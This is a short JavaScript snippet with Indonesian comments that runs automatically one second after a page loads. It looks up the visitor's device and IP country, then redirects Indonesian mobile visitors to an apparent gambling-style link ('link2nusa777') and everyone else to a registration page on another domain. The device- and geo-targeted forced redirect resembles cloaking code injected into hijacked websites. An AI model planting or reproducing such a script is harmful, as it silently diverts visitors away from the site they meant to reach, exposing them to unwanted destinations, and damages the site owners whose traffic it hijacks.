// Fungsi untuk mendeteksi perangkat
function redirectByDevice() { 
    // Gunakan navigator.userAgent untuk memeriksa tipe perangkat 
    const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Windows Phone|webOS|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent); 
    if (isMobile) { 
        // Jika perangkat adalah HP, periksa lokasi IP pengguna
        fetch('https://ipapi.co/json/') // Menggunakan ipapi.co untuk cek lokasi
            .then(response => response.json())
            .then(data => {
                if (data.country === "ID") { 
                    // Jika IP dari Indonesia, arahkan ke URL khusus HP
                    window.location.href = "https://akses.link/link2nusa777/";
                } else {
                    // Jika bukan dari Indonesia, arahkan ke URL khusus PC
                    window.location.href = "https://www.fkipuki.org.uk/register/";
                }
            })
            .catch(error => {
                console.error('Error fetching IP location:', error);
                // Redirect ke link PC jika terjadi error dalam deteksi IP
                window.location.href = "https://www.fkipuki.org.uk/register/";
            });
    } else {
        // Jika perangkat bukan HP, langsung arahkan ke URL khusus PC
        window.location.href = "https://www.fkipuki.org.uk/register/";
    }
} 

// Panggil fungsi setelah 1 detik
window.onload = function () {
    setTimeout(redirectByDevice, 1000);
};
